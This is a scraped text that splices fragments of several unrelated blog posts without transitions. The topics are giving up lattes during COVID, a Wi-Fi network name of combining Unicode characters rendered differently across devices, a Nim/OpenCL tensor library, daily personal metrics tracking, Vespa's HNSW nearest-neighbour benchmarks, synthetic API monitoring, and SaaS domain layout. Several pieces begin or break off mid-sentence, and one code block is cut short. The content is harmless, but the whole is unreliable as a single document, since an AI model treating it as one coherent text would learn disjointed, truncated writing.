internships near Starbuckses, I would get vanilla-hazelnut lattes, and my coffee runs were known for their consistency and punctuality.</p> <p>After college and graduate school, things kicked up a notch. Lots of people define their persona by their love of coffee, and I chose to be one of those. I drank coffee – lattes, in particular – religiously. My first business card’s title read <em>Caffeine Fiend</em>.<sup id="fnref:1"><a href="#fn:1">1</a></sup> I systematically sampled nearly every single cafe in San Francisco. Weirdly, I knew I didn’t really love lattes. I liked them, but a latte can ultimately only be so good. They were a habit, something I’d been doing for a long time, and had made part of my persona.<sup id="fnref:2"><a href="#fn:2">2</a></sup> Besides, I needed the kick. I realized that coffee was useful in technical, creative work not because it increases wakefulness, but because it increases <em>focus</em>. I had a latte machine in the office and a company to build, so at some point I hit ten cups a day.</p> <p>Enter March 2020. I had moved offices – no more free coffee – and was spending more on cinnamon lattes than some people spend on their mortgage. I was more cautious than most about COVID-19, and started isolating myself in early March. Being a coffee addict but not a true aficionado, I did not own anything in the way of a coffee machine. (I have never made much use of my kitchen.) I had no way to make coffee at home, and due to COVID I wasn’t in the mood to go out shopping. Almost four months later, I still haven’t had any coffee.</p> <p>Losing coffee was unpleasant at first. Abandoning a ritual can make the rest of the day feel weirdly incomplete. But I soon stopped missing or thinking about it. My quality of life had improved. With coffee, the regular motions of the day become exaggerated – there would be spikes of focus and the feeling of productivity<sup id="fnref:3"><a href="#fn:3">3</a></sup>, but there would also be caffeine crashes every four hours. The days that I used caffeine to push myself too far would invariably end in long headaches. I often felt very seriously drained at the end of the workday, and couldn’t do anything in the evening.</p> <p>The last four months, without coffee, have been much better. No headaches. No crashes. Consequently – and ironically – I’m now probably <em>more awake</em> on average throughout the day. I’ve been very surprised by how little I actually needed the caffeine, even in the morning after a short night. Thus, I’m not sure how much value caffeine actually provided me over the past few working years. I had so much of it that the beneficial effects certainly wore off (I would even drink coffee right before going to sleep). However, the downsides of coffee – trading in later energy to have more focus now, the drain and crash later in the day – never wore off.</p> <p>Ultimately, as COVID wraps up and things go back to normal, I don’t feel the need to pick up coffee again. Maybe I’ll try decaf for the pleasure of an evening latte, but I’m happy to kick the habit.</p> <hr>  <br> </article> </div></div>]]>

That name is <a href="https://mothereff.in/byte-counter#a%CC%B6%CC%81%CC%93%CC%BF%CC%88%CC%9B%CC%9B%CD%90%CD%98%CD%86%CC%90%CD%9D%CC%87%CC%92%CC%91%CD%84aaa">36 octets</a> making it over the 32 octets maxium specified in the 2012 standard of 802.11 Section 6.3.11.2.2. My router just cut the name down to 32 octets though to stay complient. This was what was being sent according to <code>iw</code> <code>a\xcc\xb6\xcc\x81\xcc\x93\xcc\xbf\xcc\x88\xcc\x9b\xcc\x9b\xcd\x90\xcd\x98\xcd\x86\xcc\x90\xcd\x9d\xcc\x87\xcc\x92\xcc\x91\xcd</code> with the raw hex being <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>.</p> <p>I decided to see how this showed up on different devices and got some pretty strange results.

At first I had no idea what they were rending these characters as. At first I thought it was just extended ascii but that third character, ∂, was not in extended ASCII. After asking around on the Apple discord server someone said it might be using the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set. It turns out it which is strange because iOS used UTF-8 internally and not Mac OS Roman as that was phased out with the release of Mac OS X.</p> <p>Speaking of Apple devices, there will not be any photos of MacOS though not from a lack of trying. I could not get either of my Macbook to acknowledge that this WiFi network existed. Neither the Wifi dropdown nor the airport commandline utility would show it.</p> <p>Windows 10 Pro 10.0.19041 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/windows10.png" alt=""></p> <p><del>Windows 10 is rendering it using what I believe to be the UTF-8 characters of each octet.

  <div>
    
    <p><em>Date: May 6, 2018, by Mamy André-Ratsimbazafy</em></p>
<p>Arraymancer is a tensor library I’m writing from the ground up in Nim. Cuda support was added in v0.3 last December, I just released the new v0.4 with OpenCL support.</p>
<p>I’d like to share a bit of my experience on working in OpenCL through Nim. First of all, you have to know that none of the big guys (Google Tensorflow, Facebook PyTorch, Apache/Amazon MxNet, Microsoft CNTK or even Intel/AMD) has first class OpenCL support.</p>
<p>Why? Probably because Nvidia is providing superb tools and documentation for frameworks developers. Also Cuda can leerage a few C++ facilities like generics and function objects that I use heavily for generic code.</p>
<p>For example in Nim+Cuda I define element-wise functions like the following and pass it to a higher-order function that will apply it element-wise on 3 tensors:</p>
<pre>

<span>template</span> <span>cuda_binary_op</span><span>(</span><span>op_name</span><span>,</span> <span>op_symbol</span><span>:</span> <span>string</span><span>)</span><span>=</span>
  <span>{</span><span>.</span><span>emit</span><span>:</span><span>[</span><span>"""
  template&lt;typename T&gt;
  struct """</span><span>,</span><span>op_name</span><span>,</span><span>"""{
  __device__ __forceinline__ void operator()(
      T *  __restrict__ dst,
      const T *  __restrict__ A,
      const T *  __restrict__ B){
      *dst = __ldg(A)"""</span><span>,</span> <span>op_symbol</span><span>,</span> <span>""" __ldg(B);
      }
  };
  """</span><span>]</span><span>.</span><span>}</span></pre><p>You can see here the advantage of C++: <tt><span>typename T</span></tt> to template over int/float/double and higher-order functions/function object for cleaner code. You can also see that Nim can directly inline C++ code with <tt><span>emit</span></tt> and I even templatize the operation_name.</p>
<p>Now what about OpenCL? Unfortunately C doesn’t offer something similar and requires a lot of boilerplate. The alternative, the C++ official OpenCL API and implementation: SYCL is very experimental and I am not sure how it works on actual GPUs.</p>
<p>However thanks to Nim metaprogramming, squashing the C boilerplate is super easy. Here is an example kernel to do C = A op B</p>
<pre><span>template</span> <span>gen_cl_apply3</span><span>*</span><span>(</span><span>kern_name</span><span>,</span> <span>ctype</span><span>,</span> <span>op</span><span>:</span> <span>string</span><span>)</span><span>:</span> <span>string</span> <span>=</span>

Create unary operation higher-order functions and add cos/sin/ln/exp in just 2 lines of code each. Furthermore allow lifting any unary operation to operations on whole tensors with a map function, expose it so that OpenCL tensors are easily customizable.</p>
<p>After using Nim + OpenCL, I actually realized that using C++ function objects was overengineering.</p>
<p>To conclude, at the moment, I am convinced that the best language to work with GPUs is Nim.</p>
<p>Oh, and for those who wants to see real Nim code for neural networks, here is a Fizzbuzz in Nim using neural networks (I didn’t implement it on GPU yet though)</p>

    <h4>TL;DR: By documenting key metrics, I came to better understand the consequences of my actions. I also gained an appreciation for the power of habits and persistence.</h4>
<figure><img src="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics.png" alt="" srcset="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics.png 1200w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-500x500.png 500w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-1024x1024.png 1024w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-150x150.png 150w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-768x768.png 768w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>
<p><em>“Commit to documenting it—no matter what.”</em> That’s the deal I made with myself in late 2018. I agreed that I’d collect the data—be it good or bad. Equally important: I made no commitment to take any other action. I figured that by keeping this simple, I had little excuse to not stick with it. Soon, it also spurred action.</p>
<h2>The tools</h2>
<p>You can collect personal metrics with many tools. The following are the ones I use.</p>
<ul>
<li>Calorie counting on iOS and web app: myfitnesspal </li>
<li>Physical data (heart rate, activity, sleep): Garmin Fenix 5X</li>
<li>Weight, body fat, BMI: Fitbit Aria</li>
<li>Metrics documentation: Numbers spreadsheet </li>
</ul>
<p>These tools aren’t perfect, but they aren’t bad, either. Myfitnesspal contains a lot of inaccurate calorie counts. This requires me to compare items/sources. Wrist-based heart rate tracking also isn’t super-accurate. That said, it’s more convenient than pairing with a chest strap.</p>
<p>Data-syncing can be clumsy. For example, my scale doesn’t talk to Garmin Connect. Still, I want accurate weight data in there for calculating exertion. So, I manually insert my weight into Garmin Connect, each morning.</p>
<p>I also started collecting all my data in Google Sheets. Displaying this data got sluggish, though. This led me to switch to Numbers, which I find snappier.</p>
<p>I also created some workflows in Alfred to speed up the process. Now, I type “gar” into Alfred to rapidly open Garmin Connect for pulling data. I do the same with myfitnesspal, Stripe, and Google Analytics. (I know I could import this data automatically, but have my reasons for not doing so. I’ll get to these in a moment.)</p>
<h2>What I measure</h2>
<p>Since starting I’ve changed which metrics I collect. For the most part, though, they sort into a few key groupings. These are:</p>
<ul>
<li>Activity (daily pushups and situps, stretching, exercise)</li>
<li>Condition (ARHR, sleep, VO2m, weight, trajectory)</li>
<li>Nutrition (meal quality, fasting, calories in/out, deficit)</li>
<li>Personal habits (reading to kids; alcohol intake)</li>
<li>Revenue (passive, billings, 30-day averages)</li>
<li>Startup activity (installs, MRR, outreach, traffic)</li>
</ul>
<p>Each day gets one row, with a column for each of the items noted above. I also keep one cell for notes. Most times this is empty but does come in handy at times. For example, if I’m away from home, I’ll use my most recent 7-day weight average. I then write: “Away; weight estimated” in the Notes cell. </p>
<h2>Observations</h2>
<p>This experience might be the longest personal experiment I’ve ever undertaken. Over the year, I learned a lot from it and collected some notes. The following are ones that stand out. I’ll return to this list and add to it, should other points come to mind.</p>
<h3>One habit leads</h3>
<p>For me, collecting metrics is a keystone habit (Charles Duhigg talks about this in <em>The Power of Habit</em>). So, I document metrics near the beginning of each day. I seldom miss a day. In the odd case that I do, I’m ill-at-ease until I’ve filled in those cells.</p>
<p>This is telling. Metrics are in part about establishing positive habits and removing negative ones. For me, this makes measuring my habits my most important habit—and I stick to it.</p>
<h3>Manual matters</h3>
<p>My first successful metrics experience related to finances. Ours weren’t where they should be, so I set aside a weekend (~4 years ago) to create a better system. I collected every expense from the previous 6 months, sorted them into groups, and averaged them. This allowed me to see our monthly expenditures. It also helped me predict costs for upcoming months.</p>
<p>This resulted in a finances spreadsheet. Every day, I manually document our bank and credit card transactions in it. Every month, I copy-and-paste the monthly template for the next month. This process allows me to track our accounts for anomalies. It helps me spot potential shortfalls. It also indicates when I can set aside surplus funds for savings.</p>
<p>Could I automate most of this with personal finance software? Yes. But, it’d distance me from the process. That extra step of documenting expenses manually only adds a few minutes to my day. In exchange for that time I gain a sense of control that I value. </p>
<p>This approach also allows for customization. For example, I fill cells with positive actions (going for a run) or key milestones (a new MRR record) in green. This sounds trivial, but it’s not. These act like gold stars and provide tiny dopamine hits that affect my behavior.</p>
<figure><img src="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak.png" alt="" srcset="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak.png 1200w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak-500x500.png 500w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak-1024x1024.png 1024w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak-150x150.png 150w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/bully-maintains-streak-768x768.png 768w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>
<h3>I can predict the future</h3>
<p>Much like I can predict our finances by documenting patterns, I can do so with personal matters. I once wrote that you <a href="http://www.erickarjaluoto.com/blog/why-you-shouldnt-step-on-the-scale/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">shouldn’t step on the scale</a>. I was wrong. A better position would have been: Don’t let today’s measurement derail your progress.</p>
<p>My weight fluctuates up to five pounds over 24 hours. This is in part because I practice alternate-day <a href="http://www.erickarjaluoto.com/blog/i-lost-one-pound-for-every-year-of-my-life/" target="_blank" rel="noreferrer noopener" aria-label="fasting (opens in a new tab)">fasting</a>. (I recognize that fasting seems extreme to some, but I find it manageable and productive.) Daily scale readings aren’t that informative. So, I tally the last week’s readings and divide the sum by 7. Doing so gives me my 7-day average. From this I see a pattern.</p>
<p>So long as I practice the same behaviors, my weight tends to follow a clear trajectory. This also allows me to calculate daily average weight loss. From this, I can extrapolate my approximate weight a week, month, or 6 months down the road. This isn’t an exact science, but it is quite useful.</p>
<h3>Data doesn’t lie (sort of)</h3>
<p>Last fall my weight loss hit a standstill. This frustrated me. Around the same time, a friend noted that weight loss involves plateaus. (I also found mention of this on Reddit.) So, I shrugged my shoulders and thought to myself, “I’ve plateaued. I guess this is as far as I go.”</p>
<p>A few weeks later, though, I took a closer look at my metrics. It turned out that I had gotten a little lax about food intake. In fact, I was up by around 500 calories a day. This wasn’t enough for me to put on weight—but it also wasn’t enough for me to drop weight.</p>
<p>I don’t want you to think that I’m obsessed with weight loss. Yet, it’s a useful way to examine how habits and tracking work—because it allows me to measure outcomes so easily.</p>
<p>We often make up reasons for why something doesn’t work. Data helps me overcome these preconceptions. It also sets me up to better assess what’s actually happening.</p>
<h3>Measurement spurs action</h3>
<p>I make a point of implementing a couple of small rituals aimed at creating more time with my kids. One is a nightly bedtime story. The problem is that by 9:00 PM, I’m beat. This leads me to put off reading, reasoning that we can do it the next night. The next night is often the same.</p>
<p>I know the boys are getting old for bedtime stories. I’m glad they take part in them now but recognize they won’t for much longer. So, I track each night I read to them. Doing so is a small act, but it serves as a daily reminder about whether I’m making time for something that matters. The longer I track such things, the more I tend to see my behavior shift. </p>
<h3>Streaks have limits</h3>
<p>A lot of folks believe in the power of streaks. This practice involves setting a habit and tracking its completion each day. Most times folks use a streaks tool or calendar to do this. The plan is to create a habit by not breaking the streak. I like this idea but it doesn’t work for me.</p>
<p>My problem with streaks is that breaking one is demoralizing. It is so much so that it stops me from starting another. I felt this most after 104 days of abstaining from alcohol. We were at a fundraiser, and I thought ”I’ve been good. Why not treat myself to a glass of wine?” The next day, I had to start my count again from 1. Bummer! Actually, more than that—I felt like I had thrown away all that discipline.</p>
<p>So, I adapted streaks to work better for me. Now, I track every day I don’t drink over the year. This means that if I slip one day, it’s OK. I haven’t lost my count for the year. I enjoy the break and start again the next day. This reduces the sense of failure and lowers the emotional cost of restarting.</p>
<h3>Exercise works faster than I expected</h3>
<p>I always figured that you needed to do a lot of exercise before you saw results. To my surprise, I found the opposite this year. For example, a week of short runs every morning can drop my average resting heart rate (ARHR) by 10 beats a minute. On a bit longer of a timeline, I saw my VO2 max increase by 15% over six months with moderate activity.</p>
<p>These aren’t super-impressive numbers. Yet, they make me optimistic about how much I could achieve if I applied myself. I’m also quite excited by the gains I saw by adding a small amount of interval training. This seemed to pay off within only days.</p>

<h3>Metrics evolve</h3>
<p>I started out thinking that my metrics collection method needed to be perfect. In fact, this idea got in the way of me starting. Turns out it’s not the case. The act of collecting metrics is the important part. Once you start you can retool as you see what works or doesn’t.</p>
<p>For example, I tracked daily steps for a long time. I didn’t find this information that useful (because it doesn’t accommodate my cycling or skiing.) I also tried to make a habit of cold showers and drinking matcha tea. Neither of these stuck either—so, I removed them.</p>
<p>I figure it’s reasonable for a document like this to evolve. I do version the file when I make significant changes, though. This allows me to roll it back if I change my mind.</p>
<h3>Persistent action delivers</h3>
<p>Collecting metrics taught me that small matters add up to significant outcomes. These are for both the better and for the worse. You don’t put on weight through one night of binging. You do so with just one beer a night.</p>
<p>Think of this way: On a sedentary day, I burn ~2,200 calories. That’s not a lot. If I manage to stay under that number and add one beer a day, I’ll quickly find the number on my scale moving upward. But, removing 200 calories from my allotment of 2,200 has the opposite …</p></div></div></div></div>

                <p>Searching for the nearest neighbors of a data point in a high dimensional vector space is an important problem for many real-time applications.
For example, in Computer Vision it can be used to find similar images in large image datasets.
In Information Retrieval, pre-trained text embeddings can be used to match documents based on the distance between query and document embeddings.
In many of these applications,
the document corpus is constantly evolving and the search is constrained by query filters applied on the metadata of the data points.
For example, in E-commerce,
a nearest neighbor search for products in a vector space would typically be constrained by product metadata like inventory status and price.</p>

<p><a href="https://vespa.ai/">Vespa</a> (the open source big data serving engine) already supports exact
<a href="https://docs.vespa.ai/documentation/nearest-neighbor-search.html">nearest neighbor search</a>
that is integrated with the Vespa query tree and its filter support.
This enables you to get the exact nearest neighbors meeting the filter criterias of the query.
This works well when the number of documents to calculate nearest neighbors for is small,
e.g when the query filter is strong, or the document corpus is small.
However, as the number of documents to consider increases, we want to trade exactness for performance and we need an approximate solution.</p>

<p>This blog post is part 1 in a series of blog posts where we share how the Vespa team implemented an approximate nearest neighbor (ANN) search algorithm.
In this first post, we’ll explain why we selected HNSW (Hierarchical Navigable Small World Graphs)
as the baseline algorithm and how we extended it to meet the requirements for integration in Vespa.
Requirements included supporting real-time updates, integration with the Vespa query tree, and being flexible enough to fit a wide range of use cases.</p>

<h2 id="requirements--challenges">Requirements &amp; Challenges</h2>
<p><a href="https://vespa.ai/">Vespa</a> is an open source real-time big data serving engine.
In a typical application, the document corpus is constantly evolving.
New documents are added and removed, and metadata is being updated.
A typical use case is news article search and recommendation, keeping a week, month or year’s worth of articles,
continually adding or updating new articles while selectively removing the oldest ones.
In this case, nearest neighbor search over pre-trained text embeddings could be used in combination with query filters over metadata.</p>

<p>Based on the existing functionality and flexibility of Vespa,
we defined a set of requirements an ANN search algorithm had to support to be a good fit for integration:</p>
<ul>
  <li>Indexes used in the algorithm must be real-time updateable with low latency and high throughput.
Data points can be added, updated and removed, and the entire corpus should not be needed when creating the index.</li>
  <li>Concurrent querying with low latency and high throughput without huge performance impact due to ongoing update operations.</li>
  <li>Seamless integration with the Vespa query tree and its filter support.
This enables correct results, compared to just increasing top K for the nearest neighbor search algorithm to compensate when query filters are used.</li>
</ul>

<h2 id="algorithms-background">Algorithms Background</h2>
<p>There exists a lot of algorithms for ANN search.
Many of these are summarized and analyzed in
<a href="https://arxiv.org/abs/1610.02455">Approximate Nearest Neighbor Search on High Dimensional Data — Experiments, Analyses, and Improvement (v1.0)</a>
and
<a href="https://arxiv.org/abs/1612.07545">A Revisit of Hashing Algorithms for Approximate Nearest Neighbor Search</a>.
In addition, benchmark results for different algorithms over different datasets are summarized in
<a href="http://ann-benchmarks.com/">ANN Benchmarks</a>.</p>

<p>Existing algorithms are mainly focused on a stable document corpus where all data points in the vector space are known up front.
In this case the index structure is built once, and then used for nearest neighbor searches.
To support real-time updates, we looked for algorithms that were either incremental in nature or could be modified to meet this requirement.</p>

<p>There are three broad categories of algorithms: tree-based, graph-based and hash-based.
We choose one from each category for a more detailed exploration.
This selection was based on how they performed in benchmarks within papers and in
<a href="http://ann-benchmarks.com/">ANN Benchmarks</a>,
and how easy the algorithm was to modify to fit our requirements.</p>

<p>We ended up with the following:</p>
<ul>
  <li><strong>Annoy</strong><br>
Annoy is tree-based and described in
<a href="https://erikbern.com/2015/10/01/nearest-neighbors-and-vector-models-part-2-how-to-search-in-high-dimensional-spaces.html">Nearest neighbors and vector models – part 2 – algorithms and data structures</a>.
It takes a straightforward engineering approach to the ANN problem, and is quite easy to understand and implement.
An Annoy index consists of N binary trees, where each tree partitions the vector space using random hyperplanes at each node in the tree.
The implementation is available on <a href="https://github.com/spotify/annoy">github</a>.</li>
  <li><strong>HNSW - Hierarchical Navigable Small World Graphs</strong><br>
This is graph-based and described in
<a href="https://arxiv.org/abs/1603.09320">Efficient and robust approximate nearest neighbor search using Hierarchical Navigable Small World graphs</a>.
HNSW builds a hierarchical graph incrementally,
and has great search performance with high recall, motivating us to prototype it for comparison.
Each node in the graph represents a point in the vector space, and nodes are linked to other nodes that are close in space.
The implementation is available on <a href="https://github.com/nmslib/hnswlib">github</a>.</li>
  <li><strong>RPLSH - Random Projection based Locality Sensitive Hashing</strong><br>
This is hash-based and described in
<a href="https://arxiv.org/abs/1612.07545">A Revisit of Hashing Algorithms for Approximate Nearest Neighbor Search</a>.
The implementation is available on <a href="https://github.com/ZJULearning/RPLSH">github</a>.
Since the random hyperplanes used for projections can be selected up-front
(only depending on the number of dimensions of the vector space) this approach is data-independent.
For our purposes, we could use the hash value as a filter,
where only documents having most bits in common with the hash value of the query data point would be considered for full distance computation.
This would give us very little extra memory and CPU usage and would be easy to fit into our exact (brute-force) nearest neighbor feature.
It was the first algorithm that we implemented as a prototype.
However, in our prototype we found that getting a significant speedup required a large sacrifice of quality.
For more info, see <em>Dropping RPLSH</em> below.</li>
</ul>

<p>We created prototype implementations of the three algorithms in C++.
This gave us a deeper understanding and the ability to make necessary modifications to support real-time updates and query filters.
The prototypes were also used to do low-level benchmarking and quality testing.</p>

<h2 id="prototype-benchmark">Prototype Benchmark</h2>
<p>We benchmarked the three prototype implementations to look at indexing throughput and search throughput with different document corpus sizes.
We used the
<a href="http://corpus-texmex.irisa.fr/">1M SIFT (128 dim)</a>
and
<a href="http://corpus-texmex.irisa.fr/">1M GIST (960 dim)</a>
datasets, where one vector corresponds to a document.
In this section, we summarize the results of the 1M SIFT tests. Findings were similar with the 1M GIST dataset.</p>

<h3 id="setup">Setup</h3>
<p>The tests were executed in a CentOS 7 Docker image using Docker Desktop on a MacBook Pro (15 inch, 2018)
with a 2.6 GHz 6-Core Intel Core i7 CPU and 32GB of memory. The Docker setup was 8 CPUs, 16GB of memory and 1GB of Swap.</p>

<p>The configuration of the algorithms were as follows:</p>
<ul>
  <li><strong>Float size</strong>: 4 bytes.</li>
  <li><strong>Annoy</strong>: Number of trees = 50. Max points in leaf node = 128.</li>
  <li><strong>HNSW</strong>: Max links per node (M) = 16. Note that level 0 has 32 links per node (2*M). Number of neighbors to explore at insert (efConstruction) = 200.</li>
  <li><strong>RPLSH</strong>: 512 bits used for hash and linear scan of hash table.</li>
</ul>

<h3 id="indexing-throughput">Indexing Throughput</h3>
<p>The 1M SIFT dataset was split into chunks of first 100k, 200k, and 500k vectors,
and indexing throughput was tested with different corpus sizes.
The index structures for all algorithms started empty, and we added one document at a time to simulate real-time feeding.
One thread was used. Necessary adjustments to the prototype implementations were done to accommodate this.
Note that the data points for 10M documents are estimated based on the 100k and 1M data points.</p>

<p>Observations:</p>
<ul>
  <li>Indexing throughput depends on corpus size for Annoy and HNSW, where throughput is halved when corpus size is increased by 10x.</li>
  <li>Indexing throughput for RPLSH is independent of corpus size.</li>
  <li>Annoy is <strong>4.5 to 5 times</strong> faster than HNSW.</li>
  <li>RPLSH is <strong>23 to 24 times faster</strong> than HNSW at 1M documents.</li>

<h3 id="search-throughput-qps">Search Throughput (QPS)</h3>
<p>The search throughput was measured after the indexes were built, using a single benchmarking client and search thread.
We used the query vectors from the dataset, and searched for the nearest K=100 neighbors from the query vector.
To get comparable quality results between the algorithms we had to adjust some of the parameters used.
The default behavior for Annoy is to collect K=100 candidates per tree, and then calculate brute force distance for all those.
To get comparable quality between Annoy and HNSW we had to collect 8000 candidates instead of 5000.
For RPLSH, we used the Hamming distance between hashes to pre-filter candidates after collecting 200 candidates into a heap,
skipping full distance calculation for most candidates. For HNSW, we asked for 100 candidates.</p>

<p>Observations:</p>
<ul>
  <li>HNSW outperforms Annoy and RPLSH. At corpus size 1M the QPS is <strong>9 times as high</strong> as Annoy,
and <strong>16 times as high</strong> as RPLSH at comparable quality.
Similar observations between hnswlib and Annoy are found in <a href="http://ann-benchmarks.com/">ANN Benchmarks</a>,
where the QPS of hnswlib is 5-10 times higher at the same quality on all tested datasets.</li>
  <li>The HNSW search algorithm depends heavily on the number of links between nodes, which again depends on corpus size.
The QPS is halved when the corpus size is increased by 10x.
We see the same during indexing as that uses the search algorithm to find candidates to connect to.</li>
  <li>The Annoy search algorithm is less dependent on corpus size, at least with small corpus sizes.
The static cost is driven by brute force calculation of distances for the candidate set, 8000 in this case.
With very high corpus size the cost of traversing the binary trees will likely match and exceed the static cost.
We don’t know where this limit is.</li>
  <li>For RPLSH, doing exhaustive …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-post-content=""><p>Application development is increasingly dependent upon APIs, often integrating with many different services. To address uncertainty in these dependencies, many developers use synthetic tests to monitor their API activity. This common tooling helps you discover when an API is up or down, and whether it’s returning the expected results. While useful, synthetic testing cannot mimic the reality of today’s applications.</p>
<p>When your application uses multiple services, your tests will miss:</p>
<ul>
<li>Internal microservices that don’t have public endpoints</li>
<li>Errors specific to real usage that you haven’t foreseen</li>
<li>Changes to your application after the tests are written</li>
</ul>
<p>In this post, we’ll share more about these three scenarios, and explain why real-time monitoring of live API calls is the best solution.</p>
<h2>Your Microservices Might Be Untestable</h2>
<p>Traditional synthetic testing isn’t even an option for many enterprises today. If you’re building internal APIs that are not Internet-accessible, such as popular microservices architectures, you’ll be restricted to only public interfaces. Sometimes that is enough, but for sufficiently advanced use cases, it typically means you’re leaving much of your software untested.</p>
<p>Most synthetic monitoring tools run as SaaS. You log in to a dashboard and set up your series of API calls and criteria. Then, at defined intervals, the monitor calls the endpoints—typically from cloud providers in various locations—to ensure the synthetic tests pass. To achieve this test with microservices requires that the calls can be made from within your systems, which may not be accessible by public DNS.</p>
<p>You may be able to use synthetic monitoring with simpler scenarios:</p>
<ul>
<li>An internal API running a mobile app or other frontend</li>
<li>Calling a small number of third-party APIs</li>
</ul>
<p>In both of these cases, the endpoints must be accessible to the Internet. With some manual effort, you could create tests to periodically mimic these client-side calls. With this approach, you can only monitor pre-determined request and response data to ensure it matches expectations. Not only does this testing miss issues with internal services, it also only gives you a partial view of your external calls.</p>
<h2>Synthetic Monitoring Only Tells Part of the Story</h2>
<p>The problem with synthetic monitoring is in the name: it’s synthetic. You are only testing what you’ve explicitly included. Many errors are dependent upon real usage situations—if you haven’t accounted for it, your monitoring will not catch it.</p>
<p>Synthetic tests can miss:</p>
<ul>
<li>Problems related to your application’s network</li>
<li>Edge cases based on the credentials you use</li>
<li>Bugs that only arise with dynamic request content</li>
<li>Latency not captured in a one-off test</li>
<li>Error messages sent with 200-level status codes</li>
<li>Issues you have not considered with your tests</li>
</ul>
<p>These issues only become worse if your application depends on multiple third party APIs. We found <a href="https://www.hoss.com/blog/api-consumption-insights/" target="_blank" rel="nofollow noopener noreferrer">over half of developers consume more than five APIs</a>. With the many potential points of failure, you can see why it’s tempting to set up monitors. Yet, we discovered most developers don’t monitor the external APIs they call and may not have access to a sandbox that can be easily tested.</p>
<p>To understand the full picture into API performance requires total visibility to what your application is experiencing. There are situations where synthetic tests make sense, but you cannot depend on them to capture all the issues with your application.</p>
<p>If it’s important for your customers to have an experience with limited errors, it’s critical that you go beyond synthetic tests. </p>
<h2>It’s Hard to Maintain Synthetic Tests</h2>
<p>Where synthetic monitoring makes sense is for APIs that you provide publicly or for approved partners. The surface area of tests is limited to a single API with some well-defined use cases. Third-party API monitoring is more difficult, especially if you try to cover some of the scenarios synthetic tests can miss. External <a href="https://www.hoss.com/blog/3-common-api-Integration-mistakes-and-how-to-avoid-them/" target="_blank" rel="nofollow noopener noreferrer">APIs often change without notice</a>, so tests can give you alerts when things aren’t as you expect. Then comes the hardest part: maintenance of those tests when your own app is also changing.</p>
<p>Let’s say you’ve gathered the details of every API call you make during a typical user’s experience with your application. Next, you translate those use cases into synthetic tests, so you can be alerted when it catches errors. You’ll be missing atypical user paths, but that may be a trade-off you want to make. You can publish your tests and monitor them regularly, feeling somewhat confident. As long as you don’t change anything.</p>
<p>Once you’ve built an application, it’s not done. Most software requires bug fixes, user experience enhancements, and new features. Inevitably, you’ll need to adapt how you make your calls to external APIs. Building comprehensive synthetic tests for an application that calls multiple APIs is difficult in the first place. Keeping it updated with the exact calls as your code evolves might be an impossible task.</p>
<p>Ideally, you could add some process to sync monitors with your real calls. For example, include synthetic test maintenance in your code review. An unfortunate side effect could be slower development cycles. All in the name of tests that can’t even capture every scenario.</p>
<h2>Use Real Monitoring for Real Visibility</h2>
<p>We’ve bumped into all these issues, in our development work and with Hoss customers. Whether consuming your own microservices or third party APIs, our goal is to give you <a href="https://www.hoss.com/" target="_blank" rel="nofollow noopener noreferrer">deep visibility and better customer experiences</a>. Keep track of performance based on real scenarios, not synthetic tests. You can enable error alerts and reduce the amount of time spent debugging your integrations.</p>

<![CDATA[Domain Structure for SaaS Products]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>While being involved in a couple of side-projects in the last months, all of the SaaS products, I had to discuss and choose the domain architecture.</p>

<p><img src="https://ghinda.com/blog//assets/images/articles/domain-structure-full.png" alt="Domain structure for SaaS Products"></p>

<p>First, let me introduce some concepts:</p>

<ul>
  <li>Marketing website is the main website of the SaaS product dedicated mostly for attracting new customers. It is dedicated to convincing visitors to become customers, to tell a story about the product, to present showcases.</li>
  <li>product app (or SaaS app) is the actual product that is used by customers (logged in users).</li>
</ul>

<p>When I say domain architecture, I am referring to the following choices:</p>

<ol>
  <li>
    <p><strong>Should the marketing website be part of the same codebase as the product app, or should these two sites live in different codebases having their independent release cycles?</strong></p>
  </li>
  <li>
    <p><strong>Should the domain structure for the marketing website and product app be based on subdomains (like example.com and app.example.com) or based on pathnames (like example.com and example.com/app)?</strong></p>
  </li>
</ol>

<p>There is another question in case you want to offer to your customers an URL a slug (a namespace) when using your product app:</p>

<ol start="3">
  <li><strong>Should you offer the slug as a subdomain (like organisatio-namespace.example.com) or as a part of the pathname  (like example.com/organisation-namespace)?</strong></li>
</ol>

<p>Bonus question:</p>

<ol start="4">
  <li><strong>Should the blog be on a subdomain (like blog.example.com) or as a subfolder (like example.com/blog)?</strong></li>
</ol>
      <h2 id="my-recommendations">
        
        
          My recommendations <a href="#my-recommendations">#</a>
        
        
      </h2>

<p>Here are my answers to these questions:</p>

<ol>
  <li>
    <p>Use separate codebases for the product app and marketing website. Also, deploy them on separate machines. This results in less downtime when releasing them, almost no common bugs, and allowing different experiments on each one of them without the fear of affecting customers. Don’t use this when you want to display in your marketing websites live data from the product app.</p>
  </li>
  <li>
    <p>Use a subdomain structure for the separation between the marketing website and product app. This creates greater flexibility in how you generate routes for both of them (due to domain separation),  it allows you to configure CDN or separate traffic between them easily. You get a small security bonus when using per-domain settings.</p>
  </li>
  <li>
